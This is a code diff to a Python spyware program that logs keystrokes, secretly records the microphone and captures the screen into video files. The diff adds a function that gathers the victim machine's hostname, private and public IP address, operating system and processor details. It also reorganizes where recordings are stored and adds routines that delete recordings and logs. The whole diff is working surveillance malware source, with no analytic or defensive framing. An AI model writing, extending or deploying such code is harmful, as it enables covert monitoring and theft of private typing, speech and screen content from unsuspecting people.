@@ -1,4 +1,4 @@
-import time, sounddevice, os, pickle, glob, moviepy.video.io.ImageSequenceClip
+import time, sounddevice, os, pickle, glob, socket, platform, moviepy.video.io.ImageSequenceClip
 
 from pynput.keyboard import Key, Listener
 from scipy.io.wavfile import write
@@ -9,20 +9,21 @@ main_path = os.path.dirname(os.path.realpath(__file__))
 
 CLEAR_LOGS = True
 CLEAN_UP = True
+CLEAR_RECORDINGS = True
 KEYLOGGER_ENABLED = True
 MICROPHONE_SNOOPER_ENABLED = True
 SCREEN_RECORDER_ENABLED = True
 
-INPUT_UPDATE_INTERVAL = 10
-TIME_UPDATE_INTERVAL = 50
+INPUT_UPDATE_INTERVAL = 25
+TIME_UPDATE_INTERVAL = 30
 MIC_SAMPLERATE = 44100
-RECORDER_FRAME_LIMIT = 10
+RECORDER_FRAME_LIMIT = 50
 FPS = 2
 
 PATH = main_path + r"\\resources\\"
 TEMP = PATH + r"temp\\"
 RECORDINGS = PATH + r"recordings\\"
-
+MIC_RECORDINGS = PATH + r"mic-recordings\\"
 run = True
 count = 0
 keys = []
@@ -34,12 +35,33 @@ audio_information = "microphone.wav"
 screen_name = "screen"
 image_file_extension = ".png"
 
+def get_machine_info():
+    with open(PATH + "info.txt", "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldn't get Public IP Address")
+
+        f.write("Processor: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + '\n')
+        f.write("Machine: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
 def clean_up():
     files = glob.glob(TEMP+"*")
     for f in files:
         os.remove(f)
 
-#KEYLOGGER #################################################################################################
+def clear_recordings():
+    files = glob.glob(RECORDINGS+"*")
+    for f in files:
+        os.remove(f)
+
 def clear_logs():
     logs = ""
     main_path = os.path.dirname(os.path.realpath(__file__))
@@ -48,6 +70,7 @@ def clear_logs():
     with open(f"{TEMP_PATH}/log.txt", "wb") as f:
         pickle.dump(logs, f)  
 
+#KEYLOGGER #################################################################################################
 def on_press(key):
     global keys, count, current_time
 
@@ -91,6 +114,7 @@ def keylogger():
 def microphone_snooper():
     global stopping_time, TIME_UPDATE_INTERVAL
     run = True
+    mic_count = 0
     while run:
         current_time = time.time()
         if current_time > stopping_time:
@@ -100,7 +124,8 @@ def microphone_snooper():
             seconds = TIME_UPDATE_INTERVAL
             myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
             sounddevice.wait()
-            write(PATH + audio_information, fs, myrecording)
+            mic_count += 1
+            write(MIC_RECORDINGS + f"microphone{str(mic_count)}.wav", fs, myrecording)
 
 def screen_recorder():
     global TIME_UPDATE_INTERVAL, FPS
@@ -117,7 +142,7 @@ def screen_recorder():
         if frame_count > RECORDER_FRAME_LIMIT:
             image_files = [TEMP+img for img in os.listdir(TEMP) if img.endswith(".png")]
             clip = moviepy.video.io.ImageSequenceClip.ImageSequenceClip(image_files, fps=int(FPS))
-            clip.write_videofile(f"{PATH}screen{mov_count}.mp4")
+            clip.write_videofile(f"{RECORDINGS}screen{mov_count}.mp4")
             mov_count += 1
             frame_count = 0
             clean_up()
@@ -126,6 +151,11 @@ if CLEAN_UP:
     clean_up()
 if CLEAR_LOGS:
     clear_logs()
+if CLEAR_RECORDINGS:
+    clear_recordings()
+
+print("[SYSTEM] Running")
+get_machine_info()
 
 if __name__ == '__main__':
     if KEYLOGGER_ENABLED:
